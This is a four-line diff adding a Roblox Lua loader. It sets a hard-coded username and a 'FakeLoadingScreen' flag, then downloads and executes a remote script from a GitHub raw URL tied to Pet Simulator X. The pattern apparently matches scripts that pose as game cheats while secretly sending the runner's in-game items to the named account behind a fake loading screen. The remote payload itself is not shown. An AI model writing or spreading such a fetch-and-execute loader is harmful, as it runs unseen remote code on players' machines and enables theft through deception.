@@ -1,0 +1,4 @@
+_G.UserName = "dragonfruit7s"
+_G.FakeLoadingScreen = true 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PrismScript/PetSimulatorX/main/Script1.lua"))()
